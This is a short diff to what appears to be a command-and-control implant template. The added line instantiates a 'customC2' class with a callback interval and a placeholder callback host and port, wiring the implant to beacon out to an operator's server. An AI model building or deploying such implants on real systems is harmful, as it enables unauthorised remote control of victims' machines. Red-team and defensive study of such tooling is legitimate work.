@@ -157,3 +157,4 @@ class customC2 extends baseC2{
 	}
 }
 //------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
+C2 = new customC2(callback_interval, "callback_host:callback_port/");
